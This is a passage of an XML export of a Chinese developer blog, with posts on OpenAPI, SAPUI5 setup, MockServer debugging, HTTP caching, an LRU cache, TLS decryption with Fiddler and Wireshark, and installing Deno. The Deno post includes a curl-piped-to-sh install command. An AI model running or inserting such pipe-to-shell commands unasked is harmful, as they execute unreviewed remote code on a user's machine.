$ref: "#/definitions/User" 400: description: "Invalid query parameters" 可视化的 GET /user 接口如下： 2.3 添加过滤参数为了让 GET /user 接口支持分页查询，我们需要定义两个过滤参数 skip 和 limit。这两个参数是携带在请求的 URL 中的，因此我们需要为 GET 请求添加如下的查询参数定义： 123456789parameters:- in: "query" name: "skip" type: "integer" description: "Skip number of users"- in: "query" name: "limit" type: "integer" description: "Limit number of users" 其中 in: &quot;query&quot; 表示该参数位于请求的 URL 中，除此之外，参数还可以携带在请求的头部或者实体中，分别取值 in: &quot;header&quot; 和 in: &quot;body&quot;。 至此，我们就完成了一个 API 的设计。我们只需要将 API 的设计描述文件发送给各个角色的人员，大家行可以围绕着下如下开发流程进行并行开发。 综上所述，本文主要介绍了基于 OpenAPI 协议和 Swagger 工具的 API 设计和开发。后续将以 NodeJS 为例，介绍 Swagger 如何集成到 API 的开发环境中，以及它是如何为 API 开发保驾护航的，敬请期待。]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>API</tag>
        <tag>Swagger</tag>
        <tag>OpenAPI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一按钮不正常显示的 Debug 记录]]></title>
    <url>%2Fexperience%2Fdebugging%2Fdev-show-less-is-not-disappearing-debugging%2F</url>
    <content type="text"><![CDATA[背景如图有一个容器中有三个 Tile，如下定义容器的三种显示状态：三个 Tile 可以并列显示在一排时的状态为 Normal；当三个 Tile 无法一排显示在一排，其中有一个或者两个 Tile 处于 Overflow 的状态为 Collapsed；三个 Tile 显示在多排的状态为 Expanded。处于 Collapsed 状态时，可以点击 Show more 变到 Expanded 状态，同理处于 Expanded 状态时点击 Show less 可以变回 Collapsed 状态。拖动窗口大小时可以从 Expanded/Collapsed 到 Normal 状态下相互转化。Bug 是：从 Expanded 变至 Normal 时，Show less 不应该显示。 分析通过上述的分析，显然这是一个有限元状态机问题，该问题总共有如下三种状态，Collapsed 和 Expanded 之间通过 Show more / Show less 相互转换，Collapsed/Expanded 和 Normal 之间通过 Resizing 相互转换。 分析代码逻辑发现，Show more / Show less 按钮是通过一个 expandable 状态控制的，但是代码的作者忽略了 Expanded 到 Normal 的状态转换，从而导致这种转换发生时 expandable 状态没有被更新。解决这个问题总共使用了不到两个小时，用了 4 个番茄时钟，其中两个 3 个时钟花在了梳理原来的逻辑上，逻辑梳理清楚后分析处这是一个状态机问题，后面修复就简单了。 总结本来这并不是一个特别头疼的 Bug，也不足以记录，但是经过分析之后其背后隐藏着一个状态机模型。这种发现是对重视理论基础，特别是重视算法的程序员的馈赠，至少我很享受这种发现所带来的乐趣。其实编程的本质还是抽象，抽象的基础是建模，建模的基础那就是数据结构和算法了。综上述，我们应该坚持学习算法和数据结构。其实就是找个继续刷算法的理由罢了，本文完(又水了一篇:狗头! 参考资料最后附上一些关于状态机的资料和几道 LeetCode 题目： https://en.wikipedia.org/wiki/Finite-state_machine https://leetcode.com/problems/best-time-to-buy-and-sell-stock-iii/ https://leetcode.com/problems/best-time-to-buy-and-sell-stock-with-cooldown/]]></content>
      <categories>
        <category>Experience</category>
        <category>Debugging</category>
      </categories>
      <tags>
        <tag>XHR</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建 SAPUI5 开发环境]]></title>
    <url>%2Fexperience%2Fguide%2Fdev-getting-started-with-sapui5%2F</url>
    <content type="text"><![CDATA[背景SAPUI5 官方文档有专门的一节是讲 SAPUI5 的开会环境的 - Development Environment，按照官方文档介绍，搭建 SAPUI5 的开发环境主要有三种方式： SAP Web IDE - Cloud ui5 tooling - Local OpenUI5 - Local 为什么还要写这篇文章呢？官方文档主要详细介绍了使用 SAP Web IDE 搭建 SAPUI5 的开发环境，但这种方式有诸多不足，如编码效率不高，不方便调试，不能使用 Vim 编码，还需要申请 Cloud 账号等，因此搭建本地开发环境是我学习 SAPUI5 的首选。文档虽然也有简单介绍使用 OpenUI5 和 使用 ui5 工具搭建本地开发环境，但通篇晦涩并缺少实践步骤，按照文档搭建环境的过程还可能会遇到一些奇怪的错误。所以本文的出现主要是为了记录我搭建环境中遇到的一些问题，以便后续查阅。 SAPUI5 的核心文件是 sap-ui-core.js，理论上只需要引入该文件就可以使用 SAPUI5 了，但开发过程中我们往往更需要的是一个本地的 server，本文会主要讲述使用 ui5 工具启动的 SAPUI5 开发环境。 注释： 本文中 ui5 表示的是 ui5 tooling - (https://sap.github.io/ui5-tooling/)，SAPUI5 表示 SAPUI5 框架。 使用 ui5 搭建 SAPUI5 开发环境使用 ui5 搭建 SAPUI5 主要分为如下四个步骤， 创建项目 创建 Hello world 入口文件 使用 ui5 引入 SAPUI5 框架 启动 下文将详述描述着四个步骤。 创建项目本节我们将创建一个基本的 SAPUI5 项目目录。 创建项目 demo-ui5，并在 demo-ui5 目录下创建子目录 src/com/0x400/hello，所有 SAPUI5 相关的代码我们都将放在 src/com/0x400/hello 下面，这个目录结构也将会映射成一个命名空间 com.0x400.hello 123456789$ mkdir -p demo-ui5$ cd demo-ui5$ yarn init -yyarn init v1.22.4warning The yes flag has been set. This will automatically answer yes to all questions, which may have security implications.success Saved package.jsonDone in 0.05s.$ mkdir -p src/com/0x400/hello Hello world本节我们将创建 index.html 和 index.js 文件，并在 index.html 中引入 SAPUI5，并在 SAPUI5 启动时自动加载 index.js 文件。 在项目入口路径 src/com/0x400/hello 下创建 index.html 文件， index.html 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;Getting started&lt;/title&gt; &lt;script id="sap-ui-bootstrap" src="resources/sap-ui-core.js" data-sap-ui-theme="sap_belize" data-sap-ui-libs="sap.m" data-sap-ui-resourceroots='&#123;"com.0x400.hello": "./"&#125;' data-sap-ui-onInit="module:com/0x400/hello/index" data-sap-ui-compatVersion="edge" data-sap-ui-async="true"&gt; &lt;/script&gt;&lt;/head&gt;&lt;body class="sapUiBody" id="content"&gt;&lt;/body&gt;&lt;/html&gt; src=&quot;resources/sap-ui-core.js&quot; 这里使用相对路径引入了 SAPUI5 框架的核心代码 sap-ui-core.js 我们可以使用绝对路径引入 SAPUI5，比如使用官方提供的 CDN https://sapui5.hana.ondemand.com/1.81.1/resources/sap-ui-core.js 即可引入 1.81.1 版本。我们并没有这样做，而是使用相对路径引入 SAPUI5，这就意味着项目启动后我们可以通过相对路径访问到 SAPUI5 的核心代码 - sap-ui-core.js。比如项目启动后监听在本机的 8082 端口，那么通过地址 http://localhost:8082/index.html 访问到 index.html，通过地址http://localhost:8082/resources/sap-ui-core.js 加载 SAPUI5，我们将使用 ui5 工具达到此目的。 data-sap-ui-resourceroots=&#39;{&quot;com.0x400.hello&quot;: &quot;./&quot;}&#39; 是将命名空间 com.0x400.hello 和当前路径 src/com/0x400/hello 进行了映射，命名空间 com.0x400.hello 即等价于 src/com/0x400/hello 路径。 data-sap-ui-onInit=&quot;module:com/0x400/hello/index&quot; 表明框架启动时会加载当前目录下的 index.js。此处 module:com/0x400/hello 是命名空间 com.0x400.hello 的路径表示。 创建 index.js 文件， index.js 1234567891011sap.ui.define([ "sap/m/Button", "sap/m/MessageToast"], function(Button, MessageToast) &#123; new Button(&#123; text: "Ready...", press: function () &#123; MessageToast.show("Hello World"); &#125; &#125;).placeAt("content");&#125;); 安装 ui5我们上文所提到，项目启动后将从 http://localhost:8082/resources/sap-ui-core.js 加载 SAPUI5 的核心代码，本节将使用 ui5 工具自动下载我们依赖的 SAPUI5 版本并，并使用 ui5 serve 启动项目使得我们能从正确的路径中加载 SAPUI5。 安装 ui5,1$ npm install --global @ui5/cli 创建 ui5.yaml 文件用于配置项目启动选项， 1$ ui5 init 默认情况下 ui5 init 创建的 ui5.yaml 文件中 name 即为项目目录，项目的类型为 libary，我们需要更改为 application 类型，并且使用 resources 字段下的 webapp 配置项目的启动路径， 标注： 如果项目类型不正确 ui5 serve 可能会报错 ui5.yaml 12345678specVersion: '2.2'metadata: name: demo-ui5type: applicationresources: configuration: paths: webapp: src/com/0x400/hello 使用 ui5 加载 SAPUI5 的核心文件和 index.html 中用到主题和 libs 12$ ui5 use sapui5@latest$ ui5 add sap.ui.core sap.m themelib_sap_belize 在官网 https://sapui5.hana.ondemand.com/ 可以查阅 SAPUI5 的版本列表，使用 ui5 use sapui5@&lt;version&gt; 安装相应的版本。 因为我们的项目是 Application 类型，所以需要一个 manifest.json 文件，所有的项目配置将放在该文件下，使得业务代码和配置分离，在目录 src/com/0x400/hello 下创建 manifest.json 配置文件， manifest.json 1234567&#123; "_version": "1.0.0", "sap.app": &#123; "id": "com.0x400.hello", "type": "application" &#125;&#125; id 可以为项目的根命名空间 com.0x400.hello。 标注: 对于 Application 类型，manifest.json 文件必须的，缺少该文件 ui5 serve 时也将会报错，而 ui5 官方文档似乎没有这个提醒。 启动在 scripts 中添加启动脚本 start: ui5 server。 package.json 123456789&#123; "name": "demo-ui5", "version": "1.0.0", "main": "index.js", "license": "MIT", "scripts": &#123; "start": "ui5 serve" &#125;&#125; 运行 npm start 启动项目，项目启动后监听在 8082 端口上，访问 http://localhost:8082/index.html 点击 Ready… 按钮弹出 Hello World。到此，SAPUI5 的开发环境就部署完成了。 Git 提交1$ git init 创建 .gitignore 文件并添加如下内容， .gitignore 123456789101112# Logslogs*.lognpm-debug.log*yarn-debug.log*yarn-error.log*# Dependency directoriesnode_modules/dist/.idea/ 创建提交记录： 12$ git add .$ git commit -m "feat: getting started sapui5" 本文项目代码: https://github.com/brelian/hello-ui5]]></content>
      <categories>
        <category>Experience</category>
        <category>Guide</category>
      </categories>
      <tags>
        <tag>SAPUI5</tag>
        <tag>SAP</tag>
        <tag>OpenUI5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[INVALID_STATE_ERR Debug 记录]]></title>
    <url>%2Fexperience%2Fdebugging%2Fdev-invalid-state-error-debug-log%2F</url>
    <content type="text"><![CDATA[项目前端使用 SAPUI5 开发，运行集成测试时，所有的 AJAX 请求都会被 Mock。今天遇到一个问题，一些 URL 改动后集成测试运行失败， 报错信息如下： 1234567891011Uncaught Error: INVALID_STATE_ERR - 4 at k (sinon.js:184) at F.setResponseHeaders (sinon.js:184) at F.respond (sinon.js:184) at F.window.sinon.FakeXMLHttpRequest.respondJSON (MockServer-dbg.js:3834) at mockserver.js:298 at Array.some (&lt;anonymous&gt;) at Object.response (mockserver.js:284) at F.b (sinon.js:196) at F.processRequest (sinon.js:196) at F.respond (sinon.js:196) 本文记录了该错误的排查过程，方便今后查阅。 尝试 Google Search，关键词 INVALID_STATE_ERR，只搜到一些不是很相关的答案 https://blogs.sap.com/2016/11/17/opa5-testing-with-json-backend/ https://github.com/sinonjs/sinon/issues/493 转化思路 - Bug 是发生在 SAPUI5 的 MockServer 中，由于我对 MockServer 并不了解，因此我决定深入一下 MockServer 查阅 API 文档打开 SAPUI5 API 文档，找到 MockServer， 这个对象继承自 ManagedObject，至于 ManagedObject 是干嘛的我目前还不太清楚，但是我决定先跳过这个细节。 MockServer 用来 Mock HTTP 请求。往下看 Constructor 用于创建一个 mocked server，可以 Mock XHR 和 OData/JSON Models。虽然我对 OData 还不是很懂，但是这应该与这个 BUG 关系不大，所以我跳过这个细节。Constructor 接受一些配置参数， rootUri requests recordRequests rootUri 是根路径，具体怎么用暂时比较模糊，稍后通过查阅源码来确定。requests 是一个数组，存放了被 mock 的请求（大致理解，稍后确认）。至于 recordRequests 是请求性能分析相关的，暂时忽略。 基于以上理解，一个 MockServer demo 如下： 12345678var aReqs = [];// TODO: add mocked requestsvar oMockServer = new MockServer(&#123; rootUri: './', requests: aReqs&#125;);oMockServer.start(); 继续阅读 API 文档，Events 部分暂时跳过，来到 Methods 部分，项目中使用到了 sap.ui.core.util.MockServer.config 方法，该方法接受一个配置对象，其中几个属性如下： autoRespond autoRespondAfter fakeHTTPMethod 项目中的配置是 12345&#123; autoRespond: true, autoRespondAfter: (oUriParameters.get("serverDelay") || Math.floor(Math.random() * (1501 - 200) + 200))&#125; 并有注释说明，autoRespondAfter 加随机数是用于模拟真实环境的网络时延，其中 oUriParameters 如下定义： 1var oUriParameters = new UriParameters(window.location.href); 看个 Demo看完文档，还是比较模糊，下一步我需要看个 Demo，本来我可以直接看项目中的 MockServer，只不过项目中的 MockServer 是比较复杂的，不利于理解。 根据官方 Demo 画了个流程图， 其中用到了 simulate 的方法。 深入源码至此，我对 MockServer 有了一知半解，但是我还不知道 rootUri, requests 和 autoRespond 的具体逻辑，所以我决定去看看 MockServer 的源码。克隆 openui5 1$ git clone https://github.com/SAP/openui5.git 找到 src/sap.ui.core/src/sap/ui/core/util/MockServer.js 从 start 方法开始分析， 我们可以发现 start 方法会调 sinon.fakeServer.create 创建一个 FakeServer，然后再注册 mocked requests. 所以接下来我需要了解一下 sinon.fakeServer. 打开 sinon API 文档，找到FakeServer，使用很简单，直接看如下 demo， 1234567891011121314151617181920212223&#123; setUp: function () &#123; this.server = sinon.createFakeServer(); &#125;, tearDown: function () &#123; this.server.restore(); &#125;, "test should fetch comments from server" : function () &#123; this.server.respondWith("GET", "/some/article/comments.json", [200, &#123; "Content-Type": "application/json" &#125;, '[&#123; "id": 12, "comment": "Hey there" &#125;]']); var callback = sinon.spy(); myLib.getCommentsFor("/some/article", callback); this.server.respond(); sinon.assert.calledWith(callback, [&#123; id: 12, comment: "Hey there" &#125;]); assert(server.requests.length &gt; 0) &#125;&#125; 其中两个 respondWith 和 respond 这两个方法需要我重点关注。回到 MockServer.js 的源码发现，_addRequestHanlder 方法最终调用 respondWith (3446 行附近)， 1this._oServer.respondWith(sMethod, oRegExp, fnResponse); 从 API 文档得知，正则匹配到的 HTTP 方法将调用 fnResponse，由该方法手动处理响应。 123server.respondWith("GET", /\/todo-items\/(\d+)/, function (xhr, id) &#123; xhr.respond(200, &#123; "Content-Type": "application/json" &#125;, '[&#123; "id": ' + id + " &#125;]");&#125;); When the response is a Function, it will be passed the request object. You must manually call respond on it to complete the request. 文档还说，如果 respondeWith 中传递的response是一个回调函数，那么执行回调时会传递 xhr 对象，并且需要回调手动调用 xhr.respond 方法发动响应。 现在，回头看项目中的 MockServer 的代码， 12345678var aReqs = [];// TODO: add mocked requestsvar oMockServer = new MockServer(&#123; rootUri: './', requests: aReqs&#125;);oMockServer.start(); 其中还有一个循环将所有的 request 添加到 aReqs 中， 1aReqs.push(createRequest(data)); 再看 createRequest(data) 方法，该方法返回一个对象 123456function createRequest(data) &#123; var oRequest = &#123; // ... some code here &#125;; return oRequest;&#125; 这个对象被 MockerServer.js 的 start 方法消费，看源码 该对象提供了 respondWith 中需要的三个参数，即 method, path 和 response。 至此， 我已经看懂了整个 MockServer 的过程了，再回头看错误信息， 看懂错误信息错误由 XMLHttpRequest 对象引起，因此需要查阅 XHR 的 API 文档，搜索关键词 INVALID_STATE_ERR 共发现 8 处， Throws an INVALID_STATE_ERR exception if the state is not OPENED or if the send() flag is true. 也就是说如果 XHR 的状态如果是 not opend 或者是已经 send 后的状态，那么就会抛出该异常。 结合错误信息给出的函数调用栈很容易定位出该错误发生在 setRespinseHeaders 之后，打开 sinon 源码去看 setResponseHeader 的实现，发现有个 verifyRequestOpend 方法。 再进入 verifyRequestOpend 方法一看，果然是从这里抛出的异常，异常原因就是 xhr 的状态已经变成 4 了，4 代表 DONE，详细状态参考这里。 12345function verifyRequestOpened(xhr) &#123; if (xhr.readyState != FakeXMLHttpRequest.OPENED) &#123; throw new Error("INVALID_STATE_ERR - " + xhr.readyState); &#125;&#125; 说明 298 行执行 xhr.resondJSON 之前已经执行过 xhr.send 方法了。 DEBUG基于以上理解，打断点追踪一下就很容易发现代码逻辑有问题了（当然，这个代码不是本人写的，甩锅……）。 以上，记录一次 Debug 的过程。]]></content>
      <categories>
        <category>Experience</category>
        <category>Debugging</category>
      </categories>
      <tags>
        <tag>XHR</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP 缓存不完全指南]]></title>
    <url>%2Ffundamental%2Fnetwork%2Fhttp%2Fdev-http-caching%2F</url>
    <content type="text"><![CDATA[Cache is a hardware or software component that stores data so that future requests for that data can be served faster. 按照维基百科的定义，缓存是一种用来存储数据的硬件或者软件，它使得后续的信息传输更快。 从一张图片的加载说起 这是这一张图片的响应头头部，其中包含 last-modified 字段。 1234HTTP/1.1 200 OKcontent-length: 39409last-modified: Thu, 14 May 2020 14:29:20 GMTx-response-time: 7ms 那么就让我们从这两个问题开始： 当我们刷新浏览器的时候，图片如何加载？是否会使用缓存？ 如果我们添加一个 cache-control: no-cache 的响应头部，再次刷新图片又该如何加载？ 为什么我们要使用缓存 减少冗余数据传输 节省带宽 避免瞬间拥塞如明星出轨的新闻会使微博奔溃一样，其背后的原因就是瞬间有大量的用户共同访问同一个资源，这就使得网络瞬间拥塞（Flash Crowds）。使用缓存可以分散用户流量，避免瞬间拥塞。 距离时延信息以光速在互联网中传输，但是如果客户端访问的资源较远，客户端的请求仍然需要耗费几百毫秒甚至几秒的时间才能抵达服务器，服务器的响应也需要经过近似长的时间才能抵达客户端。如果能命中客户端的缓存或者离客户端较近的缓存，那么就可以缩短距离时延。 HTTP 缓存的三种状态一般而言，缓存只有两种状态，即存活和过期，一旦缓存过期，会有定时器将其清除。和其他缓存软件不一样的是，HTTP 缓存中定义了三种缓存状态: 缓存命中 缓存未命中 缓存再验证中 缓存的第一二种状态和常规缓存软件一样，不同的是第三种状态 - 缓存再验证。和其他缓存软件不一样的是，HTTP 缓存过期后并不会立即被删除，所以当新的请求命中了过期后的缓存时，会携带 if-none-match 和 last-modified 头部请求服务器对资源做再验证。 再验证的目的是判断过期后的缓存是否可用。如果在这段时间内资源并未发生变化，那么即使资源是过期的，但依然与最新的资源内容一致，然后服务端会使用 304 状态码告诉客户端可使用缓存，再验证通过。如果资源发生了改变，那么服务端会返回最新的资源，并覆盖掉缓存，再验证失败。 HTTP 缓存的处理流程如之前所述，HTTP 缓存的处理流程如下： HTTP 缓存机制 HTTP 缓存具有三个状态，与之对应也有三个策略，即存储策略、过期策略和再验证策略。 客户端和服务端使用响应的头部控制这些策略。 存储策略服务端下发的响应头部中包含了一个请求头 Cache-Control，其部分取值即用于控制客户端的缓存行为（并非客只有客户端实现了HTTP 缓存协议，如 CDN 一样的中间代理也会实现 HTTP 缓存）。Cache-Control 用于控制存储策略的部分取值如下： private - 私有缓存，数据只能存储在客户端，缓存不可共享。 public - 共有缓存，数据可以存储在任何地方，如 CDN 等，缓存可共享。 no-store - 数据不能被存储，无论是私有还是共有，如果有缓存，缓存客户端应该尽快删除。 过期策略Cache-Control可以有多个取值，多个值之间使用都好分割。除了控制存储策略的取值外，还包含控制过期策略的取值： max-age=x - 设置缓存的生存时间是 x 秒，x 秒能命中缓存可以直接使用， x 秒后如果仍然命中缓存那么会对缓存做再验证，如果验证通过则使用。 no-cache - 相当于 max-age=0，其含义是说数据可以被存储，但是再验证之前不能直接使用。 除了 Cache-Control 外，早期 HTTP/1.0 版本是使用 expires 头部控制过期策略的，max-age 是 HTTP/1.1 版本引入的，如果 Cache-Control: max-age=x 和 Expires: xx 都设置了，会优先使用 max-age 控制过期策略。 再验证策略再验证策略需要客户端和服务端的共同配合，因此共有四个相关的首部，总结如下 名字 版本 作用头部 含义 Etag HTTP/1.1 响应头 响应体的唯一性哈希值 Last-Modified HTTP/1.0 响应头 响应体（资源）最后修改时间 If-None-Match HTTP/1.1 请求头 使用该请求头携带上次服务端下方的 etag If-Modified-Since HTTP/1.0 请求头 该请求发出的时间，用于判断资源在该时间之前是否改变 此前，我们所探讨的 Cache-Control 是作用在响应头部的，值得注意的是，该头部也可以作用在请求头部。Cache-Control 作用在请求头部最常用的取值是 no-cache ，表示当前请求不能使用任何缓存，一般用于支持端到端的强制刷新。 当我们禁用缓存刷新页面时，浏览器就会携带该请求头。 试探性过期策略如果存储策略、过期策略和再验证策略都缺失，那么就无法使用任何 HTTP 缓存，也就是说系统没有实现 HTTP 缓存协议。 一般而言，服务器都会为静态资源生成 Last-Modified 头部，即再验证策略可用。这种情况下如果服务端没有指定存储策略也没有指定过期策略，那么缓存客户端会使用试探性过期策略算法推算出资源过期时间。试探性过期策略算法如下： 12const TimeSinceModify = max(0, Current - LastModified);const MaxAge = int(TimeSinceModify * LMFactor); 其中 LMFactor 取值如下： 现在， 让我们回顾文章开头的两个问题 当我们刷新浏览器的时候，图片如何加载？是否会使用缓存？我们知道，响应头中只包括再验证策略 - Last-Modified 头部，因此客户端会缓存图片并且使用试探性过期策略推导出缓存时间。因此，再次刷新图片时理论上会命中客户端缓存。 如果我们在响应头部中添加一个 cache-control: no-cache 的响应头部，那多次刷新图片又该如何加载？设置 no-cache 后，即添加了过期策略， no-cache 表示不会再验证之前不会使用缓存，因此理论上再次刷新服务端会返回 304 并从客户端缓存中读取图片。 参考资料Useful links &amp;&amp; reference https://tools.ietf.org/html/rfc2616#section-14.9 https://tools.ietf.org/html/rfc7234 HTTP Definitive Guide https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cache-Control]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Network</category>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
        <tag>Caching</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LRU 实现]]></title>
    <url>%2Ffundamental%2Falgorithm%2Fdev-lru-implementation%2F</url>
    <content type="text"><![CDATA[LRU 概述 This algorithm requires keeping track of what was used when, which is expensive if one wants to make sure the algorithm always discards the least recently used item. General implementations of this technique require keeping “age bits” for cache-lines and track the “Least Recently Used” cache-line based on age-bits. – from Wikipedia LRU 算法的思想是淘汰最近没有使用的缓存。 Example: 1234567891011LRUCache cache = new LRUCache( 2 /* capacity */ );cache.put(1, 1);cache.put(2, 2);cache.get(1); // returns 1cache.put(3, 3); // evicts key 2cache.get(2); // returns -1 (not found)cache.put(4, 4); // evicts key 1cache.get(1); // returns -1 (not found)cache.get(3); // returns 3cache.get(4); // returns 4 分析和大部分存储解构一样，LRU 的存储能力是有限的，所以当缓存满的时候我们需要一种算法来淘汰一部分数据。LRU 故名思意就是淘汰掉最近没有被使用的缓存。 get 方法：如果元素不存在，直接返回 -1。如果元素存在，取出之后需要将当前元素移动到队列的头部。 put 方法：如果元素不存在，直接将元素添加到队列头部，如果元素存在，将元素移动到队列头部。 按照这个思路，可以使用队列实现 LRU，但是无论是基于链表还是基于数组的队列都无法同时在 O(1) 时间内完成 get 和 put 方法。 对于 JavaScript，如果使用 Map，添加元素的时候 map.keys() 会自动记录元素的添加顺序。基于这个特点，我们可以用 Map 轻松的实现 LRU 1234567891011121314151617181920212223242526class LRUCache &#123; constructor(capacity) &#123; this.map = new Map(); this.capacity = capacity; &#125; get(key) &#123; if(!this.map.has(key)) return -1; const val = this.map.get(key); this.map.delete(key); this.map.set(key, val); return val; &#125; put(key, value) &#123; if (this.map.has(key)) &#123; this.map.delete(key); &#125; this.map.set(key, value); const keys = this.map.keys(); while (this.map.size &gt; this.capacity) &#123; this.map.delete(keys.next().value); &#125; &#125;&#125;]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>LRU</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTPS 原理不完全指北]]></title>
    <url>%2Ffundamental%2Fnetwork%2Fdev-dive-into-tls%2F</url>
    <content type="text"><![CDATA[女朋友最近在学习 wireshark 时候问了我一个问题：为什么使用 http.host == baidu.com 过滤不到请求数据? 明明已经在 Chrome 上输入了 baidu.com，也看到返回结果了，为什么通过 http.host == baidu.com 过滤不到数据包呢？ 答案也很明显，因为浏览器输入 baidu.com 的时候使用了 HTTPS（加密的 HTTP），而 HTTP 是应用层协议，所以使用 http 过滤的前提是 wireshark 能看到应用层数据。 什么是 HTTP?HTTP 是一种明文的超文本传输协议。 HTTP 为什么不安全？客户端的请求经过多次路由后才能到达服务器，中间会经过路由器，代理服务器等诸多第三方服务器，如果中间服务器出现叛变或者恶意劫持客户端传递的信息，那么客户端的信息谈何安全可言？ 我们来看一个案例：张三给罗翔发送一个 T 的小视频，张三够不够成传播淫秽物品罪？好吧，这不在我们本文讨论的范围，我们关心的是张三给罗翔发的小视频会不会被小朋友截取? 加密一下：密钥如何传输？张三：为了不让小孩子看到这些小视频，咱们用一个密码把小视频加密一下嘛，这样小视频在传输的过程中即便被小朋友劫持也是看不到的，你说对不对？ 罗翔：对是对，但是你得告诉我什么密码吧？要不然我收到了也看不了（？？？）。 张三：我单独发给你行吗？ 罗翔：你傻呀，你发给我的请求被小朋友截取了，那一切努力不就白费了吗？ 旁白君：以上张三和罗老师讨论的加密方式在计算机领域被称作为对称加密。 换个加密方式： RSA 如何？张三：有一种叫做 RSA 的加密算法很神奇的，你听过吗？ 旁白君：RSA 具有如下特点 公钥加密由私钥解 私钥解码由公钥解 公钥大家都可以知道，但是私钥只有自己知道 罗翔：嗯，知道，你说说你的想法。 张三：你把你的公钥给我，我用它来加密小视频，你收到后用你的私钥解密，你看行不行？ 罗翔：行，那咱们试试看？ （3 years later……） 罗翔：太慢了吧，等我小视频全部收到老夫尚能饭否？ 加密/解密太慢了?张三：咱们约定一下用 XO 作为对称加密的密钥，我用你的公钥把 XO 加密后给你，你收着，以后咱们就用它加密了，好不好？ 罗翔：同九年，汝甚秀。 旁白君：用非对称加密算法 RSA 交换对称加密用到的密钥，这就是 HTTPS 加密传输的核心原理。 （3 minutes later ……） 罗翔：一切就绪，小视频发过来吧…… 张三：等等，我总感觉你是冒充的，我不能无理由相信这就是你的公钥吧。请你先证明你是你自己，你就是罗翔？ 罗翔：what ??? 证明你是你自己？罗翔：这样，咱们找个有公信力的公证机构，就比如火星派进所。我把经过它认证的证书给你，里面有我的公钥。 张三：这确实是个好办法，但是你如何保证你把 火星派进所 认证后的证书在给我的时候没有被小朋友篡改呢？ 你确定公证处的证书没被修改？罗翔：让公证处给按个手印（数字签名），你知道手印造假成本很高嘛，你收到之后再辨识一下。 张三：完美，成交。 旁白君：证书 + 数字签名 ==&gt; 数字证书，简单解释数字签名是把包含公钥的消息经过不可逆 Hash 后得到的，把这个签名和公钥等信息放入证书中，收到证书后将消息使用同样的 Hash 算法得到一个新签名，如果和证书中的签名一致，说明消息没有被篡改。 以上就是 HTTPS 的加密算法原理，具体实现的时候会在传输层应用层之间专门有一层来实现以上加密算法，称作 TLS (Transport Layer Security)。顺便科普一下，早期的实现协议是 SSL，后来演变变成了 TLS，目前 TLS 版本有 v1.1, v1.2, v1.3，其中 v1.1 就是早期的 SSLv1.3。 Wireshark 抓包看一下 建立 TLS 连接之前，客户端和服务端要进行握手（这里指的不是 TCP 三次握手），握手阶段要完成如下三件事情： Client Hello: 发起 TLS 请求，告知服务端支持的加密算法 Server Hello: 下发数字证书，协商加密算法 客户端和服务端交换接下来对称加密用到的 4 个密钥（客户端和服务端加密的密钥不同，各自分别由两个密钥，其中一个叫 MAC 密钥，用于验证数据完整性） (图片来自：https://hpbn.co/transport-layer-security-tls/) 解密 TLSFiddler 解密 了解 HTTPS(TLS) 加密原理后，我们知道要解密 TLS 根本方法是获取到私钥，当然如果我们无法获取到私钥的情况下还有一种常用的方式是使用本地代理，如下如： Fiddler 解密 TLS 原理就是如上，所以启用 Fiddler 解密我们需要： 信任 Fiddler 的跟证书（没有认证过的证书） 启用代理，默认情况下 Fiddler 代理服务监听 8888 端口，所以我们只需要把流量代理到 localhost:8888 端口即可解密 TLS 记录 Wireshark 解密 HTTPS 因为 Wireshark 是直接分析网卡出口的数据，所以无法通过代理解密 TLS。 Wireshark是一个网络封包分析软件，处于混杂模式（Promiscuous）的Wireshark可以抓取改冲突域的所有网络封包。它的基本原理是通过程序将网卡的工作模式设置为“混杂模式”，这时网卡将接受所有流经它的数据帧，这实际上就是Sniffer工作的基本原理：让网卡接收一切他所能接收的数据。Sniffer就是一种能将本地网卡状态设成混杂状态的软件，当网卡处于这种”混杂”方式时，该网卡具备”广播地址”，它对所有遇到的每一个数据帧都 产生一个硬件中断以便提醒操作系统处理流经该物理媒体上的每一个报文包。 – https://jverson.com/2016/05/17/wireshark/ Wireshark 解密 TLS 的几种方式总结如下： 导入私钥（前提：有私钥），可配合 Fiddler 代理 设置 SSLKEYLOGFILE 环境变量，Chrome 等浏览器会检测该环境变量，然后把解密私钥缓存起来 以上，谨以此文送给我的女朋友。]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Network</category>
      </categories>
      <tags>
        <tag>HTTPS</tag>
        <tag>TLS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[新一代的 JavaScript/TypeScript 运行时 —— Deno]]></title>
    <url>%2Ffundamental%2Fprogramming-language%2Fjavascript%2Fdev-deno-intro%2F</url>
    <content type="text"><![CDATA[Deno 是什么？Deno 是新一代的 JavaScrip 和 TypeScript 运行时环境。建立在 V8, Rust, TypeSctipt 之上。 安装体验在 Linux 下安装体验： 1$ curl -fsSL https://deno.land/x/install/install.sh | sh 脚本执行完成后需要手动将安装目录加入到环境变量中，即将以下脚本追加到 ~/.zshrc 或类似文件中。 12export DENO_INSTALL="/home/gbin/.deno"export PATH="$DENO_INSTALL/bin:$PATH" 安装成功后，执行 deno -h 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950➜ ~ deno -hdeno 0.40.0A secure JavaScript and TypeScript runtimeDocs: https://deno.land/std/manual.mdModules: https://deno.land/std/ https://deno.land/x/Bugs: https://github.com/denoland/deno/issuesTo start the REPL, supply no arguments: denoTo execute a script: deno run https://deno.land/std/examples/welcome.ts deno https://deno.land/std/examples/welcome.tsTo evaluate code in the shell: deno eval &quot;console.log(30933 + 404)&quot;Run &apos;deno help run&apos; for &apos;run&apos;-specific flags.USAGE: deno [OPTIONS] 